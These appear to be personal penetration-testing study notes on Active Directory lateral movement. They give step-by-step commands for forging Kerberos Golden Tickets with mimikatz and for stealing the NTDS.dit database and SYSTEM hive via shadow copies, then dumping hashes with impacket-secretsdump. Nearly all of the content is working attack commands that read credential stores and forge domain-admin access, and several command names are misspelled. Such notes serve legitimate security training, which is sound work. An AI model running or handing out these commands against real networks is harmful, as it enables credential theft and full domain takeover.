# Active Directory Lateral Movement


## Golden Tickets

If you can obtain krbtgt's password hash, we can create our own valid TGTs. This is ggs.
- krbtgt password is never changed, only in a rare instance when upgrading from a pre-2008 Windows server, but not from newer versions.
- this means we can find very old krbtgt hashes which may be easier to crack (but you dont need to crack the hash to create golden tickets, just extract it)

In newer AD, you can only create Golden Tickets for existing users (you could previously make it for non-existing users) and assign them to any groups you want.

### Pre-requisites
1. Access to the Domain Admins group or access to the Domain Controller
2. Domain SID (can get from `whoami /user`)

### Execution

1. Get krbtgt password hash using `lsadump`, which extracts data from the SAM database
   ```
   mimikatz # privilege::debug
   mimikatz # lsadump::lsa /patch
   ```
   - `/patch` is added to attempt to disable any defences or safeguards around accessing LSASS
2. Clear tickets in memory with mimikatz `kerberos::purge`
3. Create the Golden Ticket
   ```
   mimkatz # kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM_HASH> /ptt
   ```
   - Creation of the ticket does not require any elevated privileges and can be done on non-domain-joined computers
   - By default, this ticket will provide user ID `500` which is the RID of the built-in administrator for the domain and group IDs of the most privileged AD groups, including Domain Admins
4. *(Optional)* launch new command prompt and test access:
    ```
    mimikatz # misc::cmd

    C:\> PsExec.exe \\<DOMAIN_CONTROLLER_HOSTNAME> cmd.exe
    C:\Windows\system32> whoami /groups
    ```
    - Assuming this Domain Controller was previously unreachable, we can infer if ticket was injected into memory based on whether we're granted access
    - Ensure the hostname is used in PsExec command because **using the IP will force NTLM authentication** instead and the attack will **fail**


## Shadow Copies

Make a 'shadow copy' of the Active Directory information. We can then copy this backup to our local Kali machine and use for further attacks, such as offline password cracking or pass-the-hash attacks etc.

### Pre-requisites

1. Elevated access to the Domain Controller

### Execution

1. Launch elevated shell in domain controller
2. `vshadow.exe` utility to create the backup:
   ```
   vhasdow.exe -nw -p C:
   ```
   - `-nw` = no-writers; used for speed in bacxkup creation
   - `-p` to store copy on disk
3. Take note of the backup's name in the `SNAPSHOT ID` section: "Shadow copy device name:"
4. Copy AD database from the shadow copy to the C: drive root folder:
   ```
   copy <FULL_SHADOWCOPY_DEVICE_NAME>\windows\ntds\ntds.dit C:\ntds.dit.bak
   ```
   - This needs to include the weird looking `\\?\GLOBALROOT` thing - the \\\\? just allows for long path names
5. Save the SYSTEM hive from the Windows registry using the `reg.exe` utility:
   ```
   reg.exe save HKLM\SYSTEM C:\system.bak
   ```
6. Copy both files back to Kali
7. Extract credentials, e.g. using `secretsdump` from impacket suite:
   ```
   impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
   ```
   - Use `LOCAL` keyword to do this locally.
8. Do further stuff with the hashes